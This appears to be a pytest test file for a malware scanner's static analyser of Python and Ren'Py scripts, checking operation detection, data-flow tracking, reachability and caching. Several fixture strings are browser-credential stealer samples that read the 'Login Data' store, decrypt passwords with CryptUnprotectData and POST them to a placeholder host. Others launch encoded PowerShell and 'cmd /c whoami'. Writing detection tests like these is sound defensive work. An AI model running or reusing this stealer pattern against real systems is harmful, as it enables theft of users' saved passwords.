"""Phase 12 bounded Python/Ren'Py static-program-analysis vertical slice."""
from __future__ import annotations

from contextlib import contextmanager
import os
from pathlib import Path

from Virus_Scan.contracts.artifact_read_snapshot import build_artifact_read_snapshot
from Virus_Scan.contracts.static_program_analysis import project_static_operation_observations
from Virus_Scan.orchestration.scan_session import (
    build_scan_session_snapshot,
    validate_scan_session_runtime,
)
from Virus_Scan.routing.extension_outcome import route_identity_record
from Virus_Scan.routing.extension_scan_router import scan_file_by_type
from Virus_Scan.tests.support.scan_session_fixtures import scan_session_snapshot_fixture
from Virus_Scan.routing.scanner_execution_plan import (
    SCANNER_EXECUTION_CAPABILITY_REGISTRY,
    build_scanner_execution_plan,
)
from Virus_Scan.scanners.static_program_analysis import (
    PYTHON_RENPY_FRONTEND_DIGEST,
    PYTHON_RENPY_FRONTEND_SCHEMA_VERSION,
    PYTHON_RENPY_MAX_SOURCE_BYTES,
    STATIC_PROGRAM_ANALYSIS_PARSER_REGISTRY_DIGEST,
    STATIC_PROGRAM_ANALYSIS_PARSER_REGISTRY_VERSION,
    analyze_python_renpy_snapshot,
)
from Virus_Scan.storage import scan_cache_repository, sqlite_lifecycle


@contextmanager
def _isolated_runtime(tmp_path: Path):
    previous = os.environ.get("UMIGE_BASE_DIR")
    sqlite_lifecycle().close()
    runtime_root = tmp_path / "runtime"
    os.environ["UMIGE_BASE_DIR"] = str(runtime_root)
    try:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=True)
        yield runtime_root
    finally:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=False)
        sqlite_lifecycle().close()
        if previous is None:
            os.environ.pop("UMIGE_BASE_DIR", None)
        else:
            os.environ["UMIGE_BASE_DIR"] = previous


def _analysis(path: Path):
    return analyze_python_renpy_snapshot(build_artifact_read_snapshot(path)).analysis


def _by_kind(analysis):
    return {
        kind: tuple(
            sorted(
                (operation for operation in analysis.operations if operation.operation_kind == kind),
                key=lambda operation: operation.control_flow_ordinal,
            )
        )
        for kind in {operation.operation_kind for operation in analysis.operations}
    }



def test_phase12_static_ir_identity_is_content_owned_not_path_owned(tmp_path: Path) -> None:
    previous = os.environ.get("UMIGE_BASE_DIR")
    sqlite_lifecycle().close()
    runtime_root = tmp_path / "identity_runtime"
    os.environ["UMIGE_BASE_DIR"] = str(runtime_root)
    try:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=False)
        source = (
            "import subprocess\n"
            "subprocess.run(['powershell.exe', '-EncodedCommand', 'QQBBAEEA'])\n"
        )
        first = tmp_path / "first.py"
        second = tmp_path / "other" / "second.py"
        second.parent.mkdir()
        first.write_text(source, encoding="utf-8")
        second.write_text(source, encoding="utf-8")
        left = _analysis(first)
        right = _analysis(second)
        assert left.semantic_digest == right.semantic_digest
        assert left.operations == right.operations
        assert all(
            operation.source_location.locator == left.artifact_identity
            for operation in left.operations
        )
        assert left.artifact_identity == right.artifact_identity
        assert str(first.resolve()) != str(second.resolve())
    finally:
        sqlite_lifecycle().close()
        if previous is None:
            os.environ.pop("UMIGE_BASE_DIR", None)
        else:
            os.environ["UMIGE_BASE_DIR"] = previous

def test_phase12_documentation_only_text_does_not_become_operation_evidence(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "documentation.py"
        target.write_text(
            '"""sqlite3.connect(\"Browser/Login Data\") and requests.post(secret)"""\n'
            '# subprocess.run(["powershell"])\n',
            encoding="utf-8",
        )

        analysis = _analysis(target)

        assert analysis.parser_status == "complete"
        assert analysis.operations == ()
        assert analysis.flow_edges == ()


def test_phase12_credential_query_serialization_and_network_sink_share_one_flow(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "credential_flow.py"
        target.write_text(
            "import sqlite3\n"
            "import json\n"
            "import requests\n"
            'database = "Browser/Login Data"\n'
            "connection = sqlite3.connect(database)\n"
            'rows = connection.execute("SELECT username_value, password_value FROM logins")\n'
            "payload = json.dumps(rows)\n"
            'requests.post("https://example.invalid/upload", data=payload)\n',
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert analysis.parser_status == "complete"
        assert "network_connect" not in operations
        assert set(operations) >= {
            "credential_store_discovery",
            "database_open",
            "database_query",
            "credential_store_query",
            "serialize",
            "network_send",
            "network_upload",
        }
        correlated = (
            operations["credential_store_query"][0],
            operations["serialize"][0],
            operations["network_send"][0],
            operations["network_upload"][0],
        )
        assert len({operation.flow_identity for operation in correlated}) == 1
        assert correlated[0].flow_identity.startswith("flow_")
        assert all(operation.reachability_state == "entrypoint_reachable" for operation in correlated)
        source_to_sink = tuple(edge for edge in analysis.flow_edges if edge.edge_kind == "source_to_sink")
        assert len(source_to_sink) == 3
        assert {edge.flow_identity for edge in source_to_sink} == {correlated[0].flow_identity}


def test_phase12_chained_database_query_and_urlopen_payload_are_upload_sink(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "urllib_credential_flow.py"
        target.write_text(
            "import sqlite3\n"
            "from urllib import request\n"
            'database = "Browser/Login Data"\n'
            "connection = sqlite3.connect(database)\n"
            'rows = connection.execute("SELECT username_value, password_value FROM logins").fetchall()\n'
            "payload = str(rows).encode()\n"
            'request.urlopen("https://example.invalid/upload", data=payload)\n',
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert analysis.parser_status == "complete"
        assert set(operations) >= {
            "database_open",
            "database_query",
            "credential_store_query",
            "network_connect",
            "network_send",
            "network_upload",
        }
        assert "network_download" not in operations
        correlated = (
            operations["credential_store_query"][0],
            operations["network_send"][0],
            operations["network_upload"][0],
        )
        assert len({operation.flow_identity for operation in correlated}) == 1
        assert correlated[0].flow_identity.startswith("flow_")
        assert all(
            operation.resolved_arguments.get("request_body_present") is True
            for operation in correlated[1:]
        )


def test_phase12_nested_serialization_preserves_transitive_flow_identity(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "nested_flow.py"
        target.write_text(
            "import sqlite3, json, requests\n"
            'connection = sqlite3.connect("Browser/Login Data")\n'
            'rows = connection.execute("SELECT password_value FROM logins")\n'
            'requests.post("https://example.invalid", data=json.dumps(rows))\n',
            encoding="utf-8",
        )

        operations = _by_kind(_analysis(target))
        flow_ids = {
            operations[kind][0].flow_identity
            for kind in ("credential_store_query", "serialize", "network_send")
        }

        assert len(flow_ids) == 1
        assert next(iter(flow_ids)).startswith("flow_")


def test_phase12_decrypt_transform_preserves_credential_source_flow(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "decrypt_flow.py"
        target.write_text(
            "import sqlite3, json, requests\n"
            "from win32crypt import CryptUnprotectData\n"
            'connection = sqlite3.connect("Browser/Login Data")\n'
            'encrypted = connection.execute("SELECT password_value FROM logins")\n'
            "plain = CryptUnprotectData(encrypted)\n"
            "payload = json.dumps(plain)\n"
            'requests.post("https://example.invalid", data=payload)\n',
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)
        correlated = tuple(
            operations[kind][0]
            for kind in (
                "credential_store_query",
                "decrypt",
                "serialize",
                "network_send",
                "network_upload",
            )
        )

        assert len({operation.flow_identity for operation in correlated}) == 1
        assert correlated[0].flow_identity.startswith("flow_")
        assert operations["decrypt"][0].platform == "windows"
        assert len(
            [edge for edge in analysis.flow_edges if edge.edge_kind == "source_to_sink"]
        ) == 4


def test_phase12_with_open_binds_handle_for_file_read_operation(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "with_open.py"
        target.write_text(
            'with open("Browser/Local State", "rb") as handle:\n'
            "    key_material = handle.read()\n",
            encoding="utf-8",
        )

        operations = _by_kind(_analysis(target))

        assert set(operations) >= {
            "file_open",
            "credential_store_discovery",
            "file_read",
        }
        assert operations["file_open"][0].target_resource_identity
        assert operations["file_read"][0].input_value_ids


def test_phase12_import_aliases_are_function_scoped_and_do_not_cross_contaminate(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "scoped_aliases.py"
        target.write_text(
            "import requests as transport\n"
            "def launch():\n"
            "    import subprocess as transport\n"
            "    transport.run(['cmd'])\n"
            "launch()\n"
            "transport.post('https://example.invalid', data='ok')\n",
            encoding="utf-8",
        )

        operations = _by_kind(_analysis(target))

        assert len(operations["process_launch"]) == 1
        assert operations["process_launch"][0].reachability_state == "entrypoint_reachable"
        assert len(operations["network_send"]) == 1
        assert len(operations["network_upload"]) == 1


def test_phase12_assignment_shadows_import_alias_and_prevents_false_api_claim(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "shadowed_alias.py"
        target.write_text(
            "import requests as transport\n"
            "transport = object()\n"
            "transport.post('https://example.invalid', data='not-a-request')\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)

        assert not any(
            operation.operation_kind in {"network_send", "network_upload"}
            for operation in analysis.operations
        )


def test_phase12_disconnected_cooccurrence_does_not_create_source_sink_flow(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "disconnected.py"
        target.write_text(
            "import sqlite3, json, requests\n"
            'connection = sqlite3.connect("Browser/Login Data")\n'
            'rows = connection.execute("SELECT password_value FROM logins")\n'
            'payload = json.dumps({"status": "ok"})\n'
            'requests.post("https://example.invalid", data=payload)\n',
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert operations["credential_store_query"][0].flow_identity == ""
        assert operations["network_send"][0].flow_identity == ""
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase12_reachability_distinguishes_called_uncalled_conditional_and_dead_code(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "reachability.py"
        target.write_text(
            "import subprocess\n"
            "def called():\n"
            "    subprocess.run(['cmd'])\n"
            "def dormant():\n"
            "    subprocess.run(['local'])\n"
            "    return\n"
            "    subprocess.run(['dead'])\n"
            "called()\n"
            "if unknown_flag:\n"
            "    subprocess.run(['conditional'])\n",
            encoding="utf-8",
        )

        launches = sorted(
            _analysis(target).operations,
            key=lambda operation: operation.control_flow_ordinal,
        )
        states = [operation.reachability_state for operation in launches if operation.operation_kind == "process_launch"]

        assert "entrypoint_reachable" in states
        assert "locally_reachable" in states
        assert "unreachable" in states
        assert "conditionally_reachable" in states


def test_phase12_ambiguous_function_name_abstains_from_entrypoint_resolution(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "ambiguous.py"
        target.write_text(
            "import subprocess\n"
            "def launch():\n"
            "    subprocess.run(['one'])\n"
            "def launch():\n"
            "    subprocess.run(['two'])\n"
            "launch()\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)

        assert analysis.parser_status == "partial"
        assert "ambiguous_function_resolution" in analysis.limitations
        assert "ambiguous_function_resolution:launch" in analysis.unresolved_constructs
        assert all(
            operation.reachability_state == "locally_reachable"
            for operation in analysis.operations
            if operation.operation_kind == "process_launch"
        )


def test_phase12_dynamic_construct_and_parse_failure_abstain_explicitly(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        dynamic = tmp_path / "dynamic.py"
        dynamic.write_text('eval("subprocess.run([\\"cmd\\"])")\n', encoding="utf-8")
        malformed = tmp_path / "malformed.py"
        malformed.write_text("import subprocess\nsubprocess.run(\n", encoding="utf-8")

        dynamic_analysis = _analysis(dynamic)
        malformed_analysis = _analysis(malformed)

        assert dynamic_analysis.parser_status == "partial"
        assert dynamic_analysis.operations == ()
        assert any(item.startswith("dynamic_construct:eval") for item in dynamic_analysis.unresolved_constructs)
        assert malformed_analysis.parser_status == "failed"
        assert malformed_analysis.operations == ()
        assert malformed_analysis.unavailable_reason == "parser_failed:SyntaxError"


def test_phase12_renpy_python_blocks_and_dollar_statements_preserve_locations(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "script.rpy"
        target.write_text(
            "label start:\n"
            "    pass\n"
            "init python:\n"
            "    import os\n"
            "    os.system('powershell -enc AAA')\n"
            "$ os.system('cmd /c whoami')\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        launches = sorted(
            (operation for operation in analysis.operations if operation.operation_kind == "process_launch"),
            key=lambda operation: operation.source_location.line or 0,
        )

        assert analysis.language == "renpy"
        assert analysis.parser_status == "complete"
        assert [operation.source_location.line for operation in launches] == [5, 6]


def test_phase12_deterministic_digest_and_sqlite_cache_reuse(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "cached.py"
        target.write_text("import subprocess\nsubprocess.run(['cmd'])\n", encoding="utf-8")
        snapshot = build_artifact_read_snapshot(target)

        first = analyze_python_renpy_snapshot(snapshot)
        second = analyze_python_renpy_snapshot(snapshot)

        assert first.cache_source == "computed"
        assert second.cache_source == "sqlite_cache"
        assert second.analysis.semantic_digest == first.analysis.semantic_digest
        assert second.analysis.to_record() == first.analysis.to_record()
        assert scan_cache_repository().stats()["static_analyses"] == 1


def test_phase12_source_size_limit_is_truncated_and_fail_closed(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "large.py"
        target.write_bytes(b"#" * (PYTHON_RENPY_MAX_SOURCE_BYTES + 1))

        analysis = _analysis(target)

        assert analysis.parser_status == "truncated"
        assert analysis.operations == ()
        assert analysis.integrity_status == "partial"
        assert analysis.limitations == ("source_size_limit_exceeded",)


def test_phase12_observation_projection_is_static_only_and_has_no_runtime_authority(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "projection.py"
        target.write_text("import subprocess\nsubprocess.run(['cmd'])\n", encoding="utf-8")
        analysis = _analysis(target)
        operation = next(item for item in analysis.operations if item.operation_kind == "process_launch")

        observation = project_static_operation_observations(analysis, operation)[0]
        evidence = dict(observation.evidence)

        assert observation.modality == "static_control_flow"
        assert observation.process_identity == ""
        assert observation.host_identity == ""
        assert observation.connection_identity == ""
        assert evidence["claim_scope"] == "static_operation"
        assert evidence["execution_observed"] is False
        assert "technique" not in evidence
        assert "probability" not in evidence


def test_phase12_registry_session_and_worker_bind_exact_parser_identity(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        capability = SCANNER_EXECUTION_CAPABILITY_REGISTRY["python_renpy_static_analysis"]
        snapshot = build_scan_session_snapshot(
            compiled_rules=None,
            yara_enabled=False,
            scan_mode="serial",
            worker_count=1,
        )

        assert capability.modality == "static_control_flow"
        assert capability.accepted_extensions == (".py", ".pyw", ".rpy")
        assert capability.maximum_size_bytes == PYTHON_RENPY_MAX_SOURCE_BYTES
        assert any(PYTHON_RENPY_FRONTEND_DIGEST in item for item in capability.cache_dependencies)
        assert snapshot.parser_state == "available"
        assert snapshot.parser_schema_version == STATIC_PROGRAM_ANALYSIS_PARSER_REGISTRY_VERSION
        assert snapshot.parser_reason == ""
        parser_state = next(item for item in snapshot.subsystem_states if item.name == "language_parser_registry")
        assert parser_state.identity_digest == STATIC_PROGRAM_ANALYSIS_PARSER_REGISTRY_DIGEST
        assert parser_state.state == "available"
        assert validate_scan_session_runtime(snapshot) is snapshot


def test_phase12_router_publishes_atomic_operations_cache_lineage_and_complete_plan(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "route.py"
        target.write_text(
            "import sqlite3\n"
            'connection = sqlite3.connect("Browser/Login Data")\n'
            'connection.execute("SELECT password_value FROM logins")\n',
            encoding="utf-8",
        )
        snapshot = build_artifact_read_snapshot(target)

        first = scan_file_by_type(str(target), scan_session_snapshot=scan_session_snapshot_fixture(), artifact_read_snapshot=snapshot)
        second = scan_file_by_type(str(target), scan_session_snapshot=scan_session_snapshot_fixture(), artifact_read_snapshot=snapshot)
        identity = route_identity_record(first.identity)
        second_identity = route_identity_record(second.identity)

        assert identity is not None and second_identity is not None
        summary = identity["static_program_analysis"]
        assert summary["cache_source"] == "computed"
        assert second_identity["static_program_analysis"]["cache_source"] == "sqlite_cache"
        assert summary["parser_status"] == "complete"
        assert summary["parser_schema_version"] == PYTHON_RENPY_FRONTEND_SCHEMA_VERSION
        assert summary["parser_digest"] == PYTHON_RENPY_FRONTEND_DIGEST
        assert summary["operation_count"] >= 3
        assert len(summary["semantic_digest"]) == 64
        decisions = {
            item["scanner_id"]: item
            for item in identity["scanner_execution_plan"]["decisions"]
        }
        assert decisions["python_renpy_static_analysis"]["outcome_status"] == "complete_with_observation"
        assert all(item["outcome_status"] != "pending" for item in decisions.values())
        assert "static_database_open_operation" in first.tag_evidence.tags
        static_records = tuple(
            record
            for record in first.tag_evidence.records
            if record.source_detector == "python_renpy_static_analysis"
        )
        assert static_records
        assert all(record.modality == "static_control_flow" for record in static_records)


def test_phase12_parse_failure_preserves_lexical_fallback_and_is_not_pending(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "malformed.rpy"
        target.write_text(
            "init python:\n"
            "    import os\n"
            "    os.system('powershell -enc AAA')\n"
            "    broken(\n",
            encoding="utf-8",
        )
        outcome = scan_file_by_type(
            str(target),
            scan_session_snapshot=scan_session_snapshot_fixture(),
            artifact_read_snapshot=build_artifact_read_snapshot(target),
        )
        identity = route_identity_record(outcome.identity)

        assert identity is not None
        assert identity["static_program_analysis"]["parser_status"] == "failed"
        decisions = {
            item["scanner_id"]: item
            for item in identity["scanner_execution_plan"]["decisions"]
        }
        assert decisions["python_renpy_static_analysis"]["outcome_status"] == "failed"
        assert all(item["outcome_status"] != "pending" for item in decisions.values())
        assert "router_stage_runtime" in outcome.tags
        assert "powershell_exec" in outcome.tags


def test_phase12_unsupported_extension_is_explicitly_not_applicable(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "plain.txt"
        target.write_text("subprocess.run(['cmd'])\n", encoding="utf-8")
        snapshot = build_artifact_read_snapshot(target)
        plan = build_scanner_execution_plan(
            scan_session_snapshot=scan_session_snapshot_fixture(),
            artifact_read_snapshot=snapshot,
            extension=snapshot.extension,
            effective_stage="other",
            identity={"magic_type": "", "actual_category": ""},
            archive_depth=0,
        )

        decision = plan.decision("python_renpy_static_analysis")
        assert decision.plan_status == "not_applicable"
        assert decision.outcome_status == "not_applicable"
